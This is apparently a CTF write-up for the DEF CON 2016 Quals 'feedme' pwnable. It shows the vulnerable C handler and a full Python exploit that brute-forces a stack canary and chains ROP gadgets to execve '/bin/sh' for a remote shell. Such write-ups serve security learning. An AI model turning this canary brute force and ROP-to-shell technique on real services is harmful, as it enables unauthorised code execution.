---
layout: post
title: DEF CON 2016 Quals - feedme
category: writeup
---

feedme is a *baby's first* pwnable task.

The binary is a fork-based server. There is an obvious buffer overflow vulnerability in the child process routine.

```c
int handler()
{
	char buf[32];  // [ebp-0x2c]
	int canary;    // [ebp-0xc]

	printf("FEED ME!\n");
	int size = read_byte();
	readn(buf, size);
	// Shows up to 16 bytes. Cannot leak canary with this.
	printf("ATE %s\n", tohex(buf, size, 16));
	return size;
}

void server()
{
	while (1) {
		int pid = fork();
		if (pid == 0) {
			int n = handler();
			printf("YUM, got %d bytes!", n);
			return;
		}
		else {
			waitpid(pid, &status, 0);
			printf("child exit.\n");
		}
	}
}
```

So we can exploit this program by brute-forcing stack canary and doing ROP to get a shell. Classic.

<!--more-->

```python
import pwnbox
import struct

def dw(x): return struct.pack("<I", x)

#s = pwnbox.pipe.ProcessPipe("./feedme")
s = pwnbox.pipe.SocketPipe("feedme_47aa9b0d8ad186754acd4bece3d6a177.quals.shallweplayaga.me", 4092)

def exp(pay):
    assert len(pay) < 256
    s.read_until("FEED ME!\n")
    s.write(chr(len(pay)))
    s.write(pay)
    s.read_line()
def brute_canary():
    def check_ok(val):
        exp("a"*32 + ''.join(map(chr, val)))
        return "YUM" in s.read_line()
    canary = [0]*4
    pos = 0
    while pos < 4:
        for x in range(256):
            canary[pos] = x
            print canary
            if check_ok(canary[:pos+1]):
                canary[pos] = x
                pos += 1
                break
    return ''.join(map(chr, canary))

canary = brute_canary()

int80 = 0x806fa20
popeax = 0x809e11a # eax ebx esi edi
ppppr = popeax
pppr = ppppr + 1
ppr = ppppr + 2
pr = ppppr + 3
popecx = 0x806f370 # edx ecx ebx
readn = 0x08048E7E # readn(char* buf, int cnt)
puts = 0x0804FC60
free_bss = 0x080EC68C # 20 byte unused bss space.

pay  = "A"*32
pay += canary
pay += "dead" + "beef" + "oebp"

# readn(free_bss, 12)
pay += dw(readn) + dw(ppr) + dw(free_bss) + dw(12)
# puts(free_bss), for debugging.
pay += dw(puts) + dw(pr) + dw(free_bss)
# edx = NULL (envp), ecx = free_bss+8 (argv)
pay += dw(popecx) + dw(0) + dw(free_bss+8) + dw(0xdeadbeef)
# eax = 11 (SYS_EXECVE), ebx = free_bss (filename)
pay += dw(popeax) + dw(11) + dw(free_bss) + dw(0) + dw(0)
pay += dw(int80)
exp(pay)

# 0
# free_bss  <-- free_bss + 8 (argv)
# /sh\0
# /bin      <-- free_bss (filename)
s.write_line("/bin/sh\0" + dw(free_bss))
s.interact()
```

It took some tries to brute-force the canary in time (there was a 150 second alarm)
because the network delay from Korea to US. Luckily, small canary value helped us.

